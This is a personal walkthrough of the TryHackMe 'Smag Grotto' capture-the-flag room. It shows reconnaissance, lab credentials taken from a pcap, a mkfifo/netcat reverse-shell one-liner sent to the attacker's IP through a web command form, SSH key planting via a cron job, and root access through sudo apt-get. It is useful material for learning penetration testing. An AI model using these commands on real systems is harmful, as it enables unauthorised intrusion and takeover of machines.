
https://tryhackme.com/r/room/smaggrotto

---
#### Nmap
![[Screenshot_2024-05-26_21-10-22.png]]

Gobuster showed me `/mail` with a `pcap` file in. I found creds POSTed in `http://development.smag.thm/login.php` , which are `helpdesk:cH4nG3M3_n0w`

The `/aW1wb3J0YW50/dHJhY2Uy.pcap` path is base64 encoded name, here the decoded path: `/important/trace2.pcap`

`Nikto` told the following information on `/mail`
```text
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
```

I put domains in my `/etc/hosts`
```text
10.10.3.204      smag.thm development.smag.thm
```

I used the creds above to pass the login page and I landed on a page asking for a command. I didn't get any answer on any command so I decided to setup a reverse shell and it worked
```shell
#On my machine
nc -lvnp 9001

#In the command form
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.79.56 9001 >/tmp/f
```

And here I am in as `www-data`

I found `jake` ssh public key on `/opt/.backups` and there is this line in crontab
![[Screenshot_2024-06-12_18-31-19.png]]

So I have to put my ssh public key in it to be able to connect via ssh on `jake` account
```shell
ssh-keygen -t rsa -b 4086 -f ./id_rsa
```
And then connect
```shell
ssh jake@10.10.3.204 -i id_rsa
```

And here I am in as `jake`

the `sudo -l` gave me `apt-get` and GTFObins gave me
```shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

And here I am root